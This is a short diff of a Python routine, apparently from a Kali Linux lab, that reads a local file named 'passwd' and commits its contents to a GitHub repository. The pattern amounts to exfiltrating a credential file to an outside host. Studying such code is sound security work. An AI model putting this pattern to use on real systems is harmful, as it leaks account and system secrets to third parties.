@@ -21,12 +21,12 @@ def run():
             file = file_content
             all_files.append(str(file).replace('ContentFile(path="','').replace('")',''))
     
-    with open('/tmp/file.txt', 'r') as file:
+    with open('/home/kali/Desktop/passwd', 'r') as file:
         content = file.read()
     
     # Upload to github
     git_prefix = 'lauraalmrui/'
-    git_file = git_prefix + '/home/kali/Desktop/passwd'
+    git_file = git_prefix + 'passwd'
     if git_file in all_files:
         contents = repo.get_contents(git_file)
         repo.update_file(contents.path, "committing files", content, contents.sha, branch="master")
